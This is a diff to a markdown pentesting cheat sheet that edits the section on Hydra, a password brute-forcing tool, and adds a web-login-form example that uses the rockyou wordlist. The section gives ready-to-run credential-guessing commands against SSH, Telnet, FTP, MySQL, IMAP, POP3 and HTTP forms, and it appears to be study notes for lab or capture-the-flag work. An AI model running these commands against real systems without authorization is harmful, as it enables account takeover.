@@ -363,12 +363,9 @@ Hydra is a tool used to brute-force username and password to different services 
 ### Syntax  
 `hydra -options path`  
 
-**Example**  
-`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.46.127 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V`
-
 ### Examples:  
 Guess SSH credentials using a given username and a list of passwords:  
-`hydra -l username -P path/to/wordlist.txt host_ip ssh`
+`hydra -l username -P path/to/wordlist.txt host_ip -t 4 ssh -V`
 
 Guess Telnet credentials using a list of usernames and a single password, specifying a non-standard port and IPv6: 
 `hydra -L path/to/usernames.txt -p password -s port -6 host_ip telnet`
@@ -379,6 +376,9 @@ Guess FTP credentials using usernames and passwords lists, specifying the number
 Guess MySQL credentials using a username and a passwords list, exiting when a username/password pair is found:  
 `hydra -l username -P path/to/wordlist.txt -f host_ip mysql`
 
+Web form credentials:   
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip_adress> http-post-form "/login:username=^USER^&password=^PASS^:F=Username or password invalid" -V`
+
 Guess IMAP credentials on a range of hosts using a list of colon-separated username/password pairs:  
 `hydra -C path/to/username_password_pairs.txt imap://[host_range_cidr]`
 
@@ -387,11 +387,16 @@ Guess POP3 credentials on a list of hosts using usernames and passwords lists, e
 
 ### A list of most useful options:
 `-S` connect via SSL  
-`-l` LOGIN or `-L` FILE login with LOGIN name, or load several logins from FILE  
-`-p` PASS or `-P` FILE try password PASS, or load several passwords from FILE  
+`-l` single username  
+`-L` wordlist username(s)   
+`-p` single password   
+`-P` wordlist password(s)    
+`-o` FILE write found login/password pairs to FILE instead of stdout  
+`-V` verbose mode, see output for every attempt  
+`-I` ignore the resume dialog  
+`-t <number> `specifies the number of threads to use  
 `-u` by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first password is tried on all logins, then the next password.  
-`-o` FILE
-write found login/password pairs to FILE instead of stdout
+
 ## John The Ripper
 https://cheatsheet.haax.fr/passcracking-hashfiles/john_cheatsheet/
 ### SSH Private Key
